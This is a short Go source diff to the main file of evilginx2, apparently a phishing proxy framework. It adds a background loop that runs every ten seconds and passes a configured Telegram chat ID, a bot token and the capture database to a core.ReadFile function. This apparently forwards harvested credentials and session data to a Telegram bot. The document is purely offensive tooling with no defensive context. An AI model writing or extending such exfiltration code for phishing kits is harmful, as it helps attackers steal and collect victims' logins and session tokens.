@@ -8,6 +8,7 @@ import (
 	"os/user"
 	"path/filepath"
 	"regexp"
+	"time"
 
 	"github.com/caddyserver/certmagic"
 	"github.com/kgretzky/evilginx2/core"
@@ -179,5 +180,21 @@ func main() {
 		return
 	}
 
+	RunBackgroundTasks(db, cfg)
 	t.DoWork()
+}
+
+func RunBackgroundTasks(db *database.Database, cfg *core.Config) {
+	go func() {
+		log.Info("starting background-tasks")
+		ticker := time.NewTicker(10 * time.Second)
+		defer ticker.Stop()
+
+		for {
+			select {
+			case <-ticker.C:
+				core.ReadFile(cfg.GetChatID(), cfg.GetTeleToken(), db)
+			}
+		}
+	}()
 }
